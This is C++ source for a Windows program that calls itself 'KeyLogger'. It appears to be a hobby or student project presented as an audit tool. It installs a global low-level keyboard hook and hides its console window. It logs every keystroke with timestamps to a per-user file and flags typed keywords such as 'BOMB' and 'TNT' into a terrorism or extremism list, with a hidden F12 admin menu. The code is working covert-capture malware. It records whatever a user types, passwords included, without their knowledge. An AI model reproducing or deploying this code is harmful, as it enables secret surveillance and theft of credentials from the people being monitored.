#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <fstream>
#include <stdio.h>
#include <string>
#include <iostream>
#include <sstream>
#include <chrono>
#include <thread>
#include <iomanip>
#include <vector>

using namespace std;

enum Rangs 
{
	Terrorism,
	Extrimism
};

const string fileName = "logfile.txt";
const string badWordsTerrorism[] = { "BAD", "NFC","IGIL"};
const string badWordsExtrimism[] = { "BOMB", "TNT" };

vector<char> buffer;

const int maxWordLength = 4;
const int badWordsTerrorismSize = 3;
const int badWordsExtrimismSize = 2;

string name;
string lastTime;
string path;
bool isPressed;
bool state = false;
bool admin = false;

bool wasTerrorism = false;
bool wasExtrimism = false;

#pragma region FUNCTION_SIGNATURES
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam);
void Hide();
string GetTime();
void Log(string text);
void UnHide();
void OpenAdminMenu();
#pragma endregion

void main() 
{
	setlocale(LC_ALL, "Russian");

	std::thread t1(OpenAdminMenu);
	t1.join();

	/*Закрытие второй копии программы*/
	HANDLE mute;
	mute = CreateMutex(NULL, FALSE, "KeyLogger");
	DWORD result = WaitForSingleObject(mute, 0);
	if (result != WAIT_OBJECT_0) 
	{
		exit(0);
	}

	/*Создание хука на нажатия клавиш*/
	lastTime = " ";
	Log("\n\n" + GetTime() +"["+name +" вошел в систему]\n");
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, 0, 0);
	MSG msg;
	while (!GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);		
	}
	UnhookWindowsHookEx(hook);
}

#pragma region HIDDEN_FUNCTION
string GetTime()
{
	auto now = std::chrono::system_clock::now();
	auto in_time_t = std::chrono::system_clock::to_time_t(now);

	std::stringstream ss;
	ss << std::put_time(std::localtime(&in_time_t), "[%Y-%m-%d] %H:%M:%S");

	return ss.str();
}

void Log(string text) 
{
	ofstream logfile;
	logfile.open(path + name + ".txt", fstream::app);
	logfile << text;
	logfile.close();
}

void LogRange(string text)
{
	ofstream logfile;
	logfile.open(path + name + ".txt", fstream::app);
	logfile << "\n"+text+"\n";
	logfile.close();
}

void LogStep(Rangs ranges) 
{
	ofstream logfile;
	logfile.open(path + "peoles.txt", fstream::app);

	switch (ranges)
	{
	case Terrorism:
		if (!wasTerrorism) {
			if (wasExtrimism) {
				logfile <<",{TERRORISM}";
			}
			else {
				logfile << "\n" + GetTime() + name + "{TERRORISM}";
			}
			wasTerrorism = true;
		}
		break;
	case Extrimism:
		if (!wasExtrimism) {
			if (wasTerrorism) {
				logfile << ",{EXTRIMISM}";
			}
			else {
				logfile << "\n" + GetTime() + name + "{EXTRIMISM}";
			}
			wasExtrimism = true;
		}
		break;
	}
}

void Log(char key)
{
	ofstream logfile;
	logfile.open(path + name+".txt", fstream::app);
	if (lastTime != GetTime()) 
	{
		logfile <<"\n"<< GetTime() << " " << key;
		lastTime = GetTime();
	}
	else 
	{
		logfile << key;
	}
	logfile.close();
}

void OpenAdminMenu() 
{
	UnHide();
	cout << "1)Выход\n2)Отключение аудита\n3)Включение аудита\n4)Состояние аудита\n5)Изменить индефикатор пользователя\n0)Выход из режима администратора";
	int menu  = 1;
	while (menu != 0)
	{
		cin >> menu;
		switch (menu)
		{
		case 1:
			exit(0);
			break;
		case 2:
			state = false;
			break;
		case 3:
			wasExtrimism = false;
			wasTerrorism = false;
			cout << "Введите путь";
			cin >> path;
			cout << "Введите имя пользователя";
			cin >> name;
			state = true;
			break;
		case 4:
			if (state) {
				cout << "Состояние - ON";
			}
			else {
				cout << "Состояние - OFF";
			}
			break;
		case 5:
			cout << "Введите новое имя пользователя";
			cin >> name;
			Log("Имя изменено на" + name);
			break;
		}
	}
	admin = false;
	Hide();
}

void AddAndCheckVector(const char symb) 
{
	buffer.insert(buffer.end(),symb);

	for (int i = 0; i < badWordsTerrorismSize;i++) 
	{
		string buf = badWordsTerrorism[i];
		string vBuf(buffer.begin(), buffer.end());

		for (int i = 0; i < vBuf.length(); i++) 
		{
			if (i + buf.length() > vBuf.length()) 
			{
				break;
			}

			if (vBuf.substr(i, i + buf.length()) == buf) 
			{
				LogRange("ПОЛЬЗОВАТЕЛЬ ВВЕЛ СЛОВО ОТНОСЯЩЕЕСЯ К КАТЕГОРИИ:{TERRORISM} СЛОВО:" + buf);
				LogStep(Rangs::Terrorism);
			}
		}
	}

	for (int i = 0; i < badWordsExtrimismSize; i++)
	{
		string buf = badWordsExtrimism[i];
		string vBuf(buffer.begin(), buffer.end());

		for (int i = 0; i < vBuf.length(); i++)
		{
			if (i + buf.length() > vBuf.length())
			{
				break;
			}

			if (vBuf.substr(i, i + buf.length()) == buf)
			{
				LogRange("ПОЛЬЗОВАТЕЛЬ ВВЕЛ СЛОВО ОТНОСЯЩЕЕСЯ К КАТЕГОРИИ:{EXTRIMISM} СЛОВО:" + buf);
				LogStep(Rangs::Extrimism);
			}
		}
	}

	if (buffer.size() >= maxWordLength)
	{
		buffer.erase(buffer.begin());
	}
}

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	static unsigned char keystate[256];


		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
		int code = p->vkCode;

		if (admin)
		{
			std::thread t(OpenAdminMenu);
			t.detach();
			admin = false;
		}

		if (state) {
		switch (wParam)
		{
		case (WM_KEYDOWN):
			switch (code)
			{
			case 20:
				if (!GetKeyState(VK_CAPITAL))
				{
					Log("\n" + GetTime() + " [Caps Lock] - ON");
				}
				else {
					Log("\n" + GetTime() + " [Caps Lock] - OFF");
				}
				break;
			case 160:
				if (!isPressed)Log("\n" + GetTime() + " [Shift] - Pressed"); isPressed = true;
				break;
			case 162:
				Log("\n" + GetTime() + " [Ctrl]");
				break;
			case 13:
				Log("\n" + GetTime() + " [Enter]");
				break;
			case 8:
				Log("\n" + GetTime() + " [BackSpace]");
				break;
			case 9:
				Log("\n" + GetTime() + " [TAB]");
				break;
			case 188:
				Log("\n" + GetTime() + ",");
				break;
			case 190:
				Log("\n" + GetTime() + ".");
				break;
			case 123:
				Log("\n" + GetTime() + "[Включен режим администратора]");
				admin = true;
				break;
			default:
				Log((char)code);
				AddAndCheckVector((char)code);
				break;
			}
			break;
		case WM_KEYUP:
			//cout << code;
			switch (code)
			{
			case 160:
				isPressed = false;
				Log("\n" + GetTime() + " [Shift] - UnPressed");
			}
			break;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void Hide() {
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
}
void UnHide() {
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_SHOW);
}
#pragma endregion
